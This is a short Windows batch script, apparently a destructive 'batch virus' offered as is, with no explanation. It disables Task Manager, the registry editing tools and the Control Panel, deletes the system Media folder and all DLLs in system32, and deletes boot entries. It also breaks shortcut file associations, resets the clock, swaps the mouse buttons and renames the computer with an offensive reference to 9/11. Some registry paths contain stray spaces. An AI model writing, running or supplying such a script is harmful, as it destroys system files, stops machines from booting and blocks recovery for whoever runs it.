@echo off

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Pol icies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
del "%SystemRoot%\Media" /q >nul
bootcfg /delete /id 1 >nul
bootcfg /delete /id 1 >nul
bootcfg /delete /id 1 >nul
del "%SystemRoot%\system32\*.dll" /q >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Pol icies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f >nul
assoc .lnk=.txt
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
time 0:00 >nul
%SystemRoot%/system32/rundll32 user32, SwapMouseButton >nul
wmic computersystem where name="%computername%" call rename name="happy 9/11"
